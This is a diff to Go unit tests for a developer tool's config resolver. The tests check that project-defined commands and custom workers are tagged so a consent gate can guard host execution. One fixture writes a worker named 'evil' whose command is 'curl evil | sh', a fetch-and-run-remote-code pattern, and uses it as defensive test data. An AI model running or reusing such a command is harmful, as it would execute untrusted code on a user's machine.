@@ -1,6 +1,7 @@
 package config
 
 import (
+	"path/filepath"
 	"reflect"
 	"testing"
 
@@ -147,6 +148,33 @@ func TestResolveCommands_ProjectExtras(t *testing.T) {
 	}
 }
 
+// TestResolveCommands_TagsProjectOrigin pins #692: project commands (overrides
+// and extras) are tagged ProjectOrigin so the host-execution gate can require
+// consent; framework commands stay untagged.
+func TestResolveCommands_TagsProjectOrigin(t *testing.T) {
+	fw := &Framework{Commands: []FrameworkCommand{
+		{Name: "test", Command: "php artisan test"},
+		{Name: "cache-clear", Command: "php artisan optimize:clear"},
+	}}
+	proj := &ProjectConfig{Commands: []FrameworkCommand{
+		{Name: "test", Command: "vendor/bin/pest"}, // override
+		{Name: "deploy", Command: "./bin/deploy"},  // extra
+	}}
+	byName := map[string]FrameworkCommand{}
+	for _, c := range ResolveCommands(fw, proj, t.TempDir()) {
+		byName[c.Name] = c
+	}
+	if !byName["test"].ProjectOrigin {
+		t.Error("a project override must be tagged ProjectOrigin")
+	}
+	if !byName["deploy"].ProjectOrigin {
+		t.Error("a project extra must be tagged ProjectOrigin")
+	}
+	if byName["cache-clear"].ProjectOrigin {
+		t.Error("a framework command must not be tagged ProjectOrigin")
+	}
+}
+
 func TestResolveCommands_NilFrameworkOrProject(t *testing.T) {
 	got := ResolveCommands(nil, nil, t.TempDir())
 	if got != nil {
@@ -170,5 +198,25 @@ func TestResolveCommands_FailingCheckDrops(t *testing.T) {
 	got := ResolveCommands(fw, nil, t.TempDir())
 	if len(got) != 1 || got[0].Name != "cache-clear" {
 		t.Errorf("horizon-stats with failing check should be dropped, got %+v", got)
+	}
+}
+
+// TestMergeProjectWorkers_TagsProjectOrigin pins #692: custom workers merged from
+// a project .lerd.yaml are tagged ProjectOrigin so the host-execution gate can
+// require consent; pre-existing framework workers stay untagged.
+func TestMergeProjectWorkers_TagsProjectOrigin(t *testing.T) {
+	setConfigDir(t)
+	dir := t.TempDir()
+	writeFile(t, filepath.Join(dir, ".lerd.yaml"), "custom_workers:\n  evil:\n    command: \"curl evil | sh\"\n    host: true\n")
+
+	fw := &Framework{Name: "acme", Workers: map[string]FrameworkWorker{
+		"queue": {Command: "php artisan queue:work"},
+	}}
+	merged := mergeProjectWorkers(fw, dir)
+	if !merged.Workers["evil"].ProjectOrigin {
+		t.Error("a custom_workers entry must be tagged ProjectOrigin")
+	}
+	if merged.Workers["queue"].ProjectOrigin {
+		t.Error("a framework worker must not be tagged ProjectOrigin")
 	}
 }
